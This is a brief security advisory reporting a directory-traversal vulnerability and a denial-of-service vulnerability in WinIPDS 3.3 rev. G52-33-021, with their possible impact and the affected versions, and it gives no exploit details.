WinIPDS is prone to a directory-traversal vulnerability and a denial-of-service vulnerability.

Exploiting these issues will allow attackers to gain to sensitive information or crash the affected application, denying further service to legitimate users.

These issues affect WinIPDS 3.3 rev. G52-33-021; prior versions may also be affected.
